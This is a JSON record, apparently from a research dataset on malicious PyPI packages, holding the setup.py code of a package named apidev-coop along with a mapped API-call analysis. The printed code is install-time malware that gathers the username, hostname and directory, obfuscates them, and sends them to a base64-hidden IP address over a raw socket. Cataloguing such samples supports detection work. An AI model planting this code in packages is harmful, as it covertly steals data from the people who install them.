[
  {
    "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/apidev-coop-1.2.26/apidev-coop-1.2.26/setup.py",
    "code_snippet": "try:\n\timport os\n\timport pwd\n\timport socket\n\timport base64\n\tsoft = os.getcwd().split('/')[-1]\n\tu = pwd.getpwuid(os.getuid()).pw_name\n\thname = socket.gethostname()\n\trawd = 'Y:%s %s %s'%(soft, u, hname)\n\tencd = '';t=[0x76,0x21,0xfe,0xcc,0xee];\n\tfor i in xrange(len(rawd)):\n\t\tencd += chr(ord(rawd[i]) ^ t[i%len(t)])\n\tp = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\\r\\n')%(base64.b64encode(encd)) + '\\r\\n'*2\n\ts = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\ts.settimeout(4)\n\trip = 'M' + 'T' + 'IxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=' + '='\n\ts.connect((base64.b64decode(rip), 017620))\n\ts.sendall(p)\n\ts.close()\nexcept Exception,e:\n\t# Welcome Here! :)\n\t# just toy, no harm :)\n\tpass",
    "pattern_analysis": {
      "api_sequence": [
        "os.getcwd",
        "os.getuid",
        "pwd.getpwuid",
        "socket.gethostname",
        "base64.b64encode",
        "socket.socket",
        "socket.socket.settimeout",
        "base64.b64decode",
        "socket.socket.connect",
        "socket.socket.sendall",
        "socket.socket.close"
      ],
      "api_sequence_with_args": [
        "os.getcwd()",
        "os.getuid()",
        "pwd.getpwuid(os.getuid())",
        "socket.gethostname()",
        "base64.b64encode(encd)",
        "socket.socket(socket.AF_INET, socket.SOCK_STREAM)",
        "socket.socket.settimeout(4)",
        "base64.b64decode(rip)",
        "socket.socket.connect((base64.b64decode(rip), 017620))",
        "socket.socket.sendall(p)",
        "socket.socket.close()"
      ],
      "mapped_sequence": [
        {
          "api_name": "os.getcwd",
          "id": "get_working_dir",
          "description": "Returns current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "os.getuid",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "pwd.getpwuid",
          "id": "get_username",
          "description": "Retrieves current user's login name",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "socket.gethostname",
          "id": "get_hostname",
          "description": "Retrieves current host name",
          "first_id": "basic_network_operations",
          "second_id": "network_information_gathering",
          "third_id": "address_information"
        },
        {
          "api_name": "base64.b64encode",
          "id": "encode_bytes_to_base64",
          "description": "Encodes bytes to base64-encoded bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "socket.socket",
          "id": "create_socket",
          "description": "Creates new socket object",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_creation"
        },
        {
          "api_name": "socket.socket.settimeout",
          "id": "set_socket_timeout",
          "description": "Sets timeout for socket operations",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "socket_configuration"
        },
        {
          "api_name": "base64.b64decode",
          "id": "decode_base64_to_bytes",
          "description": "Decodes base64-encoded string to bytes",
          "first_id": "data_transformation_processing",
          "second_id": "data_encoding",
          "third_id": "base_encoding"
        },
        {
          "api_name": "socket.socket.connect",
          "id": "establish_tcp_connection",
          "description": "Establishes TCP connection to specified address",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        },
        {
          "api_name": "socket.socket.sendall",
          "id": "send_socket_data",
          "description": "Sends data over socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "data_transmission"
        },
        {
          "api_name": "socket.socket.close",
          "id": "close_socket",
          "description": "Closes the socket connection",
          "first_id": "basic_network_operations",
          "second_id": "socket_communication",
          "third_id": "connection_management"
        }
      ],
      "contextual_code": "import os\nimport pwd\nimport socket\nimport base64\nsoft = os.getcwd().split('/')[-1]\nu = pwd.getpwuid(os.getuid()).pw_name\nhname = socket.gethostname()\nrawd = 'Y:%s %s %s'%(soft, u, hname)\nencd = ''\nt=[0x76,0x21,0xfe,0xcc,0xee]\nfor i in xrange(len(rawd)):\n    encd += chr(ord(rawd[i]) ^ t[i%len(t)])\np = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\\r\\n')%(base64.b64encode(encd)) + '\\r\\n'*2\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(4)\nrip = 'M' + 'T' + 'IxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=' + '='\ns.connect((base64.b64decode(rip), 017620))\ns.sendall(p)\ns.close()"
    }
  }
]